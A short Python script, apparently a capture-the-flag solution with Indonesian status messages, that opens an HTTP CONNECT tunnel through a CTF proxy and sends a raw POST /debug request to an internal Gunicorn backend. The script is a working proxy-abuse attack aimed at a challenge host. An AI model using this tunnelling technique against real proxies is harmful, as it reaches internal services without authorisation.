import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("proxy.challs.ctf.bhackari.it", 3002))

print("[*] Membuka Tunnel...")
s.sendall(b"CONNECT / HTTP/1.1\r\nHost: proxy.challs.ctf.bhackari.it:3002\r\n\r\n")
print(s.recv(1024).decode())

time.sleep(1) 

print("[*] Mengirim POST /debug ke Gunicorn...")
s.sendall(b"POST /debug HTTP/1.1\r\nHost: backend\r\nContent-Length: 0\r\n\r\n")
print(s.recv(4096).decode())

s.close()
